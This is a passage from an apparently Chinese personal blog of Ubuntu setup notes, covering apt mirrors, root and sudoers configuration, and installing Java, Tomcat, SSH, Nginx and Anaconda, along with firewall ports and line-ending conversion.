</span></span><span class="line"><span class="cl"><span class="c1"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 预发布软件源，不建议启用</span>
</span></span><span class="line"><span class="cl"><span class="c1"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span>
</span></span><span class="line"><span class="cl"><span class="c1"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>上面这个会报错</p>
<p>仓库 “https://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-security Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。</p>
<p>解决方法：https://blog.csdn.net/gezongbo/article/details/121056781</p>
<p><strong>适用于ubuntu18.04</strong></p>
<p>使用aliyun，将sources.list内容修改为下面内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu bionic main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu bionic-updates main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu bionic-security main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu bionic-proposed main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu bionic-backports main multiverse restricted universe
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>适用于ubuntu20.04</strong></p>
<p>使用aliyun，将sources.list内容修改为下面内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu focal main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu focal-updates main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu focal-security main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu focal-proposed main multiverse restricted universe
</span></span><span class="line"><span class="cl">deb http://mirrors.aliyun.com/ubuntu focal-backports main multiverse restricted universe
</span></span></code></pre></td></tr></table>
</div>
</div><p>保存退出.</p>
<p>3.更新</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置root密码">设置root密码<a hidden class="anchor" aria-hidden="true" href="#设置root密码">#</a></h3>
<p>Ubuntu的默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 <code>sudo passwd</code>，然后输入当前用户的密码</p>
<p>终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 <code>su root</code>，再输入新的密码就ok了</p>
<p><strong>如何解决：不在 sudoers 文件中此事将被报告？</strong></p>
<p>1.首先切换到root用户下，输入当前用户账号密码</p>
<p><code>su - root</code></p>
<p>2.输入sudo相关命令</p>
<p><code>chmod 740 /etc/sudoers</code></p>
<p><code>sudo gedit /etc/sudoers</code></p>
<p>3.添加权限</p>
<p>找到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Allow members of group sudo to execute any command
</span></span><span class="line"><span class="cl">       %sudo    ALL=(ALL) ALL
</span></span></code></pre></td></tr></table>
</div>
</div><p>在下面添加一行，如下</p>
<pre><code>xx ALL=(ALL) ALL  (将此处的XX修改为出现该问题的用户名！）
</code></pre>
<blockquote>
<p><strong>拓展：</strong></p>
<p>sudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码</p>
<p><a href="https://cloud.tencent.com/developer/article/1701710">Linux命令su、sudo、sudo su、sudo -i使用和区别</a></p>
</blockquote>
<h3 id="提升用户权限">提升用户权限<a hidden class="anchor" aria-hidden="true" href="#提升用户权限">#</a></h3>
<p><a href="https://www.cnblogs.com/rnckty/p/5741956.html">https://www.cnblogs.com/rnckty/p/5741956.html</a></p>
<p>Ubuntu默认root密码</p>
<p><a href="https://blog.csdn.net/jiangshuanshuan/article/details/95715837">https://blog.csdn.net/jiangshuanshuan/article/details/95715837</a></p>
<h3 id="安装java">安装Java<a hidden class="anchor" aria-hidden="true" href="#安装java">#</a></h3>
<p>Java推荐用安装包安装 之后安装Tomcat比较方便</p>
<p><strong>安装包：</strong></p>
<p><a href="https://blog.csdn.net/qq_34412086/article/details/88035820">https://blog.csdn.net/qq_34412086/article/details/88035820</a></p>
<p>1.上传安装包<code>jdk-8u301-linux-x64.tar.gz</code></p>
<p>2.解压压缩包</p>
<p><code>tar -zxvf jdk-8u301-linux-x64.tar.gz</code></p>
<p>3.配置环境变量</p>
<p><code>vim /etc/profile</code></p>
<p>在末尾加入如下配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">export JAVA_HOME=/opt/software/jdk1.8.0_301
</span></span><span class="line"><span class="cl">export JRE_HOME=${JAVA_HOME}/jre
</span></span><span class="line"><span class="cl">export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib
</span></span><span class="line"><span class="cl">export PATH=${JAVA_HOME}/bin:$PATH 
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.检查环境是否配置完成</p>
<p><code>source /etc/profile</code></p>
<p><code>java -version</code></p>
<p><strong>命令行：</strong> 不会给你配JAVA_HOME</p>
<p><a href="https://blog.csdn.net/wan_ide/article/details/99447752">https://blog.csdn.net/wan_ide/article/details/99447752</a></p>
<p>输入命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install openjdk-8-jdk-headless
</span></span></code></pre></td></tr></table>
</div>
</div><p>等待安装完成</p>
<p>安装完成后用 java -version 检验是否安装成功</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">java -version
</span></span></code></pre></td></tr></table>
</div>
</div><p>Linux如何查看JDK的安装路径</p>
<p><a href="https://www.cnblogs.com/kerrycode/p/4762921.html">https://www.cnblogs.com/kerrycode/p/4762921.html</a></p>
<h3 id="安装tomcat">安装Tomcat<a hidden class="anchor" aria-hidden="true" href="#安装tomcat">#</a></h3>
<p><a href="https://blog.csdn.net/qq_34412086/article/details/88038210">https://blog.csdn.net/qq_34412086/article/details/88038210</a></p>
<p>1.上传压缩包并解压</p>
<p><code>tar -zxvf apache-tomcat-8.5.41.tar.gz</code></p>
<p>2.配置startup.sh</p>
<p>启动Tomcat之前先进入目录<code>/usr/local/tomcat/apache-tomcat-7.0.93/bin</code>，编辑文件<code>startup.sh</code>。在<code>startup.sh</code>文件最后的exec上方添加如下配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#set java environment
</span></span><span class="line"><span class="cl">export JAVA_HOME=/opt/software/jdk1.8.0_301
</span></span><span class="line"><span class="cl">export JRE_HOME=${JAVA_HOME}/jre
</span></span><span class="line"><span class="cl">export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib
</span></span><span class="line"><span class="cl">export PATH=${JAVA_HOME}/bin:$PATH 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#tomcat
</span></span><span class="line"><span class="cl">export TOMCAT=/opt/software/apache-tomcat-8.5.41
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341073.png" alt="img"  />
</p>
<p>3.关闭Tomcat之前先进入目录<code>/usr/local/tomcat/apache-tomcat-7.0.93/bin</code>，编辑文件<code>shutdown.sh</code>。配置shutdown.sh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#set java environment
</span></span><span class="line"><span class="cl">export JAVA_HOME=/opt/software/jdk1.8.0_301
</span></span><span class="line"><span class="cl">export JRE_HOME=${JAVA_HOME}/jre
</span></span><span class="line"><span class="cl">export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib
</span></span><span class="line"><span class="cl">export PATH=${JAVA_HOME}/bin:$PATH 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#tomcat
</span></span><span class="line"><span class="cl">export TOMCAT=/opt/software/apache-tomcat-8.5.41
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.启动</p>
<p>进入到tomcat的bin目录下，<code>./startup.sh</code></p>
<p><strong>后面的环境配置可以考虑不用（不知道会不会有什么问题）</strong></p>
<p>修改文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gedit filename
</span></span></code></pre></td></tr></table>
</div>
</div><p>linux命令行下，在任意目录下启动Tomcat</p>
<p><a href="https://blog.csdn.net/qq_40794973/article/details/86591391">https://blog.csdn.net/qq_40794973/article/details/86591391</a></p>
<p>==关闭TOMCAT日志的三个方法==</p>
<p><a href="https://blog.csdn.net/ZCY5202015/article/details/120685589">https://blog.csdn.net/ZCY5202015/article/details/120685589</a></p>
<h3 id="开启远程连接ssh服务端">开启远程连接ssh服务端<a hidden class="anchor" aria-hidden="true" href="#开启远程连接ssh服务端">#</a></h3>
<p><a href="https://jingyan.baidu.com/article/359911f5a5b74857fe0306c4.html">https://jingyan.baidu.com/article/359911f5a5b74857fe0306c4.html</a></p>
<p>首先看看自己的Ubuntu是不是已经安装或启用了ssh服务，执行ps -e | grep ssh</p>
<p>我们看到只有ssh-agent 这个是ssh-client客户端服务，如果有sshd，证明你已经装好了ssh-server并已启用，当然就可以不用往下看了</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341085.jpg" alt="Ubuntu17.04 开启远程连接ssh服务端"  />
</p>
<p>如果没有安装执行sudo apt install openssh-server开始安装，输入yes回车</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341082.jpg" alt="Ubuntu17.04 开启远程连接ssh服务端"  />
</p>
<p>执行完了就代表安装完成了</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341086.jpg" alt="Ubuntu17.04 开启远程连接ssh服务端"  />
</p>
<p>然后再执行ps -e | grep ssh，发现多了sshd,远程连接本电脑就已经启用了</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341094.jpg" alt="Ubuntu17.04 开启远程连接ssh服务端"  />
</p>
<p>然后我们通过其他电脑或服务器连接本电脑执行ssh &lsquo;你的用户名&rsquo;@‘你的ip’，然后输入yes,然后输入密码，就成功连接了</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341099.jpg" alt="Ubuntu17.04 开启远程连接ssh服务端"  />
</p>
<p>最后执行ls，可以看到自己熟悉的ubuntu文件了</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341430.jpg" alt="Ubuntu17.04 开启远程连接ssh服务端"  />
</p>
<h3 id="开启远程连接ubuntu-root权限">开启远程连接ubuntu root权限<a hidden class="anchor" aria-hidden="true" href="#开启远程连接ubuntu-root权限">#</a></h3>
<p><a href="https://blog.csdn.net/qq_35445306/article/details/78771398">https://blog.csdn.net/qq_35445306/article/details/78771398</a></p>
<h3 id="ubuntu输入su提示认证失败的解决方法接上"><strong>Ubuntu输入su提示认证失败的解决方法（接上）</strong><a hidden class="anchor" aria-hidden="true" href="#ubuntu输入su提示认证失败的解决方法接上">#</a></h3>
<p><a href="https://blog.csdn.net/henren555/article/details/7546508">https://blog.csdn.net/henren555/article/details/7546508</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">终端下
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">studiogang@studiogang:~$ sudo passwd 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Password: &lt;--- 输入安装时那个用户的密码 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Enter new UNIX password: &lt;--- 新的Root用户密码 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Retype new UNIX password: &lt;--- 重复新的Root用户密码 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">passwd：已成功更新密码
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="xshell一直断开连接socket-error-event-32-error-10053">xshell一直断开连接：Socket error Event: 32 Error: 10053<a hidden class="anchor" aria-hidden="true" href="#xshell一直断开连接socket-error-event-32-error-10053">#</a></h3>
<p><a href="https://blog.csdn.net/betonme/article/details/102546857">https://blog.csdn.net/betonme/article/details/102546857</a></p>
<p>修改/etc/ssh/sshd_config文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vim /etc/ssh/sshd_config
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341444.png" alt="image-20220320160947974"  />
</p>
<p>将port的注释#删去，重启ssh服务 ,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">service ssh restart
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装nginx">安装Nginx<a hidden class="anchor" aria-hidden="true" href="#安装nginx">#</a></h3>
<p><a href="https://www.cnblogs.com/fengkun125/p/14142912.html">https://www.cnblogs.com/fengkun125/p/14142912.html</a></p>
<p>参考尚硅谷的教程安装 用wget安装Nginx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 切换至root用户</span>
</span></span><span class="line"><span class="cl">sudo su root
</span></span><span class="line"><span class="cl">apt-get install nginx
</span></span><span class="line"><span class="cl">nginx -v
</span></span><span class="line"><span class="cl">service nginx start
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>用安装包一堆坑</strong></p>
<p><code>sudo make &amp;&amp; make install</code> 后面那个命令会报没有权限</p>
<p>未发现软件包<code>gcc-c+</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install gcc
</span></span><span class="line"><span class="cl">sudo apt install g++
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>zlib</code> 找不到：</p>
<p>直接<code>wget</code>安装</p>
<p><a href="https://www.php.cn/blog/detail/13838.html">https://www.php.cn/blog/detail/13838.html</a></p>
<h3 id="tomcat开放对外的端口">Tomcat开放对外的端口<a hidden class="anchor" aria-hidden="true" href="#tomcat开放对外的端口">#</a></h3>
<p><strong>查看已经开放的端口号</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">firewall-cmd --list-all
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>对外开放访问的端口</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">firewall-cmd --add-port<span class="o">=</span>8080/tcp --permanent
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">firewall-cmd --reload
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>关闭对外端口</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">firewall-cmd --remove-port<span class="o">=</span>80/tcp --permanent
</span></span><span class="line"><span class="cl">firewall-cmd --reload
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="windows文件换行符转linux换行符">Windows文件换行符转Linux换行符<a hidden class="anchor" aria-hidden="true" href="#windows文件换行符转linux换行符">#</a></h3>
<p><a href="https://blog.csdn.net/cjf_iceking/article/details/47836201">https://blog.csdn.net/cjf_iceking/article/details/47836201</a></p>
<p>操作系统文件换行符</p>
<p>首先介绍下，在ASCII中存在这样两个字符CR（编码为13）和 LF（编码为10），在编程中我们一般称其分别为&rsquo;\r&rsquo;和&rsquo;\n&rsquo;。他们被用来作为换行标志，但在不同系统中换行标志又不一样。下面是不同操作系统采用不同的换行符：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Unix和类Unix（如Linux）：换行符采用 \n
</span></span><span class="line"><span class="cl">Windows和MS-DOS：换行符采用 \r\n
</span></span><span class="line"><span class="cl">Mac OS X之前的系统：换行符采用 \r
</span></span><span class="line"><span class="cl">Mac OS X：换行符采用 \n
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用<code>cat -A [Filename] </code>查看</p>
<p>使用命令&quot;dos2unix&quot;，如下所示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>root@localhost test<span class="o">]</span><span class="c1"># dos2unix gggggggg.txt </span>
</span></span><span class="line"><span class="cl">dos2unix: converting file gggggggg.txt to UNIX format ...
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装anaconda">安装anaconda<a hidden class="anchor" aria-hidden="true" href="#安装anaconda">#</a></h3>
<p><strong>第一步 - 检索最新版本的Anaconda</strong></p>
<p>在Web浏览器中，转到<a href="https://www.anaconda.com/download/">Anaconda下载页面</a>，可通过以下链接访问：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//www.anaconda.com/download/
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>找到最新的Linux版本并复制安装程序bash脚本。</p>
<p><strong><a href="https://so.csdn.net/so/search?q=Anaconda&amp;spm=1001.2101.3001.7020">Anaconda</a>安装包下载</strong></p>
<p>（1）<a href="https://www.anaconda.com/products/individual#download-section">官网下载</a>，下载速度较慢
（2）<a href="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/">清华大学开源软件镜像站</a></p>
<p><strong>第二步 - 下载Anaconda Bash脚本</strong></p>
<p>以sudo非root用户身份登录到您的Ubuntu 18.04服务器，进入该<code>/tmp</code>目录并使用<code>curl</code>下载您从Anaconda网站复制的链接：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">cd</span> <span class="o">/</span><span class="nx">tmp</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl</span> <span class="o">-</span><span class="nx">O</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//repo.anaconda.com/archive/Anaconda3-5.2.0-Linux-x86_64.sh
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>或者下载完成后把bash脚本传输到linux上</p>
<p><strong>第三步 - 验证安装程序的数据完整性</strong></p>
<p>通过SHA-256校验和通过加密哈希验证确保安装程序的完整性：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">sha256sum</span> <span class="nx">Anaconda3</span><span class="o">-</span><span class="mf">5.2</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="nx">Linux</span><span class="o">-</span><span class="nx">x86_64</span><span class="p">.</span><span class="nx">sh</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>输出如下所示：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="mi">09</span><span class="nx">f53738b0cd3bb96f5b1bac488e5528df9906be2480fe61df40e0e0d19e3d48</span>  <span class="nx">Anaconda3</span><span class="o">-</span><span class="mf">5.2</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="nx">Linux</span><span class="o">-</span><span class="nx">x86_64</span><span class="p">.</span><span class="nx">sh</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>第四步 - 运行Anaconda脚本</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">bash</span> <span class="nx">Anaconda3</span><span class="o">-</span><span class="mf">5.2</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="nx">Linux</span><span class="o">-</span><span class="nx">x86_64</span><span class="p">.</span><span class="nx">sh</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将收到以下输出以查看许可协议，按<code>ENTER</code>键直到到达结尾。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">Anaconda3</span> <span class="mf">5.2</span><span class="p">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">In</span> <span class="nx">order</span> <span class="nx">to</span> <span class="k">continue</span> <span class="nx">the</span> <span class="nx">installation</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">review</span> <span class="nx">the</span> <span class="nx">license</span>
</span></span><span class="line"><span class="cl"><span class="nx">agreement</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nx">Please</span><span class="p">,</span> <span class="nx">press</span> <span class="nx">ENTER</span> <span class="nx">to</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nx">Do</span> <span class="nx">you</span> <span class="nx">approve</span> <span class="nx">the</span> <span class="nx">license</span> <span class="nx">terms</span><span class="o">?</span> <span class="p">[</span><span class="nx">yes</span><span class="o">|</span><span class="nx">no</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>当到达许可证末尾时，只要同意完成安装的许可证即可输入<code>yes</code>。</p>
<p><strong>第五步 - 完成安装过程</strong></p>
<p>一旦同意许可，系统将提示选择安装位置。可以按<code>ENTER</code>接受默认位置，或指定其他位置。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Anaconda3</span> <span class="nx">will</span> <span class="nx">now</span> <span class="nx">be</span> <span class="nx">installed</span> <span class="nx">into</span> <span class="k">this</span> <span class="nx">location</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="err">/home/sammy/anaconda3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">Press</span> <span class="nx">ENTER</span> <span class="nx">to</span> <span class="nx">confirm</span> <span class="nx">the</span> <span class="nx">location</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">Press</span> <span class="nx">CTRL</span><span class="o">-</span><span class="nx">C</span> <span class="nx">to</span> <span class="nx">abort</span> <span class="nx">the</span> <span class="nx">installation</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">Or</span> <span class="nx">specify</span> <span class="nx">a</span> <span class="nx">different</span> <span class="nx">location</span> <span class="nx">below</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">/home/sammy/anaconda3] &gt;&gt;&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时，安装将继续。请注意，安装过程需要一些时间。</p>
<p><strong>第六步 - 选择选项</strong></p>
<p>安装完成后，您将收到以下输出：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
